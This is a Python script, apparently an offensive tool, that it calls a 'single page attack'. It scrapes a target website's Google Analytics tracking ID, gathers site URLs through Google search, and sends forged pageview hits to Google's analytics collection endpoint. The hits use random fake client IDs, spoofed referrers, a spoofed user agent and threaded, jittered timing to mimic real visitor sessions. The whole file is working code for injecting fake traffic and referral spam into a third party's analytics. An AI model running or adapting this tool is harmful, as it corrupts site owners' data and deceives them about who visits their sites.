import sys
import requests
import re
import time
import random
import google
import logging
from Queue import Queue
from threading import Thread

#https://developers.google.com/analytics/devguides/collection/protocol/v1/
#https://developers.google.com/analytics/devguides/collection/protocol/v1/geoid

def main():
    logging.basicConfig(level=logging.INFO)
    session = single_page_attack_session(target_url='http://zonksec.com', referral_url='https://test.com/mypage.php', bounces=2, session_jitter=.50,session_delay=30, end_with=True)
    single_page_attack(session=session, number_of_sessions=5, threads=2)




def single_page_attack(session, number_of_sessions, threads=1, delay=30, jitter=.50):
    session_queue = Queue()
    logging.info('[*] Queueing %s sessions.', str(number_of_sessions))
    for _ in range(number_of_sessions):
        session_queue.put("")
    logging.info('[*] Starting %s threads.', str(threads))
    for i in range(threads):
        worker = Thread(target=thread_session, args=(i, session_queue, session,delay,jitter))
        worker.setDaemon(True)
        worker.start()
    logging.info('[*] Waiting for threads.')
    session_queue.join()
    logging.info('[*] Single Page Attack Complete.')

def thread_session(i,q,session,delay=5,jitter=.50):
    while True:
        logging.debug('[+] Thread'+str(i)+': Starting a session')
        q.get()
        session.random_unique_cid()
        output = session.run()
        logging.info('[+] Thread' + str(i) + ': Session complete. CID: '+str(session.client_id)+'. Path: '+output)
        time_delay = delay - random.randint(0, int(delay * jitter))
        logging.info('[*] Thread' + str(i) + ': Sleeping for '+str(time_delay))
        time.sleep(time_delay)
        q.task_done()


class single_page_attack_session:
    def __init__(self, target_url, referral_url, bounce_urls = None, session_delay=30, session_jitter=.10, bounces=0, loop=1, end_with=True, tracking_id=None):
        self.target_url = target_url
        self.referral_url = referral_url
        self.page_delay = session_delay
        self.page_delay_jitter = session_jitter
        self.bounces = bounces
        self.bounce_urls = bounce_urls
        self.loop=loop
        self.end_with = end_with
        self.used_cids = []
        self.client_id = self.random_unique_cid()
        self.tracking_id = tracking_id

        #end_with logic
        if self.bounces == 0:
            self.end_with = False

        if self.tracking_id is None:
            page = requests.get(target_url)
            m = re.search("'(UA-(.*))',", page.text)
            self.tracking_id = str(m.group(1))

        #if bounce urls are need, collects them.
        if self.bounces <= 10 and self.bounces != 0 and self.bounce_urls is None:
            logging.info('[*] Bounce URLs are needed.')
            self.bounce_urls = []
            search_results = list(google.search(query="site:"+self.target_url, num=10,stop=1))
            logging.info('[+] Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.bounce_urls.append(str(result))
        elif self.bounces > 10 and self.bounce_urls is None:
            logging.info('[*] Bounce URLs are needed.')
            self.bounce_urls = []
            search_results = list(google.search(query="site:"+self.target_url, num=self.bounces,stop=1))
            logging.info('Grabbed %s bounce URLs using Google', str(sum(1 for i in search_results)))
            for result in search_results:
                self.bounce_urls.append(str(result))

    def random_unique_cid(self):
        unique = False
        while not unique:
            cid = random.randint(10000, 99999)
            if cid in self.used_cids:
                unique = False
            else:
                unique = True
                self.client_id = cid


    def run(self,client_id=None):
        if client_id is not None:
            self.client_id = client_id
        pages = []
        loop_count = 0
        last_page = self.referral_url
        pages.append(last_page)
        while loop_count < self.loop:
            target_request = analytics_request(document_location=self.target_url,document_referrer=last_page,client_id=self.client_id,tracking_id=self.tracking_id)
            target_request.send()
            pages.append(self.target_url)
            bounce_count = 0
            last_page = self.target_url
            while (bounce_count < self.bounces):
                delay = self.page_delay - random.randint(0,(self.page_delay * self.page_delay_jitter))
                logging.debug('[*] Session sleep for %i seconds.', delay)
                time.sleep(delay)
                bounce_request = analytics_request(document_location=self.bounce_urls[random.randint(0,9)],document_referrer=last_page,client_id=self.client_id,tracking_id=self.tracking_id)
                bounce_request.send()
                pages.append(bounce_request.document_location)
                last_page = bounce_request.document_location
                bounce_count += 1
            loop_count += 1
        if self.end_with:
            delay = self.page_delay - random.randint(0, (self.page_delay * self.page_delay_jitter))
            logging.debug('[*] Session sleep for %i seconds.', delay)
            time.sleep(delay)
            target_request = analytics_request(document_location=self.target_url, document_referrer=last_page, client_id=self.client_id,tracking_id=self.tracking_id)
            target_request.send()
            pages.append(self.target_url)

        behavior = ''
        for page in pages:
            behavior = behavior + page + ' => '

        return behavior[:-4]



class analytics_request:
    def __init__(self,document_referrer,document_location,client_id,tracking_id=None,version=1,hit_type='pageview',user_agent ='Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36',geo_id ='US', anon_ip =1):
        self.version = version
        self.tracking_id = tracking_id
        self.client_id = client_id
        self.hit_type = hit_type
        self.user_agent = user_agent
        self.geo_id = geo_id
        self.document_referrer = document_referrer
        self.document_location = document_location
        self.anon_ip = anon_ip

        if self.tracking_id is None:
            page = requests.get(document_location)
            m = re.search("'(UA-(.*))',", page.text)
            self.tracking_id = str(m.group(1))

    def send(self):
        params = {}
        params['v'] = self.version
        params['tid'] = self.tracking_id
        params['cid'] = self.client_id
        params['t'] = self.hit_type
        params['aip'] = self.anon_ip
        params['dl'] = self.document_location
        params['dr'] =self.document_referrer
        params['geoid'] = self.geo_id
        params['ua'] = self.user_agent

        r = requests.post('https://www.google-analytics.com/collect', data=params)
        logging.debug('[*] Request Sent. ' + str(params))


main()